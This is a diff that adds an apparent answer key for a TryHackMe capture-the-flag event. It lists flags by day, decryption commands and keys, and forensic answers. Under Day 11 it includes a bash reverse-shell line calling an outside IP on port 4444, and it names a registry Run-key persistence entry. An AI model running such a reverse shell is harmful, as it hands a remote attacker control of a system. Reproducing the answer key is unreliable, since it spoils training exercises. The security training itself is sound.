@@ -1,0 +1,126 @@
+THM{StrongStart}
+THM{NotSoSweet}
+THM{Ready2Hack}
+THM{WhereIsMcSkidy}
+THM{TrustNoBunny}
+THM{LeakedAndFound}
+THM{NoMoreDefault}
+THM{AppTrapped}
+THM{DontFeedTheBot}
+THM{EastmasIsComing}
+
+
+**Linux cli
+ls
+THM{learning-linux-cli}
+grep
+THM{sir-carrotbane-attacks}
+sudo su
+THM{until-we-meet-again}
+3ast3r-1s-c0M1nG 91J6X7R4FQ9TQPM9JX2Q9X2Z
+gpg --pinentry-mode loopback --output mcskidy_note.txt --decrypt mcskidy_note.txt
+cat > /tmp/website_output.txt
+openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
+cat /tmp/decoded_message.txt
+
+
+Welcome to Wareville’s Christmas Countdown 🎄
+21d 11h 57m 11s until Christmas!
+🎁 This Year's Most Wishlisted Christmas Items 🎁
+
+    Hardware security keys (YubiKey or similar)
+    Commercial password manager subscriptions (team seats)
+    Endpoint detection & response (EDR) licenses
+    Secure remote access appliances (jump boxes)
+    Cloud workload scanning credits (container/image scanning)
+    Threat intelligence feed subscription
+    Secure code review / SAST tool access
+    Dedicated secure test lab VM pool
+    Incident response runbook templates and playbooks
+    Electronic safe drive with encrypted backups
+
+Gibberish message (copy and decode with your UNLOCK_KEY)U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=
+
+THM{w3lcome_2_A0c_2025}
+
+
+**Day 1
+ls
+THM{learning-linux-cli}
+grep
+THM{sir-carrotbane-attacks}
+sudo su
+THM{until-we-meet-again}
+
+**Day 2
+unranked-wisdom-anthem
+1984000
+
+**Day 3
+198.51.100.55
+2025-10-12
+993
+658
+126167
+
+**Day 4
+THM{AI_MANIA}
+THM{SQLI_EXPLOIT}
+
+**Day 5
+Insecure Direct Object Reference
+Horizontal
+15
+
+**Day 6
+F29C270068F865EF4A747E2683BFA07667BF64E768B38FBB9A2750A3D879CA33
+THM{STRINGS_FOUND}
+HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\HopHelper
+http
+
+**Day 7
+Pwned by HopSec
+3aster_
+15_th3_
+n3w_xm45
+3306
+THM{4ll_s3rvice5_d1sc0vered}
+
+**Day 8
+THM{XMAS_IS_COMING__BACK}
+
+**Day 9
+THM{Cr4ck1ng_PDFs_1s_34$y}
+THM{Cr4ck1n6_z1p$_1s_34$yyyy}
+
+**Day 10
+10
+High
+4
+
+**Day 11
+malicious_mod.ko
+/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
+172.16.0.12
+203.0.113.45
+deploy
+
+**Day 12
+stored
+THM{Evil_Bunny}
+THM{Evil_Stored_Egg}
+
+**Day 13
+THM{yougotnumber1-keep-it-going}
+THM{nmumber2-was-not-tha-thard!}
+THM{Impersonation-is-areal-thing-keepIt}
+THM{Get-back-SOC-mas!!}
+THM{It-was-just-a-sp4m!!}
+THM{number6-is-the-last-one!-DX!}
+
+**Day 14
+5
+/tbfc:[A-Za-z0-9]+/
+Find me in Hopsec Island
+
+**Day 15
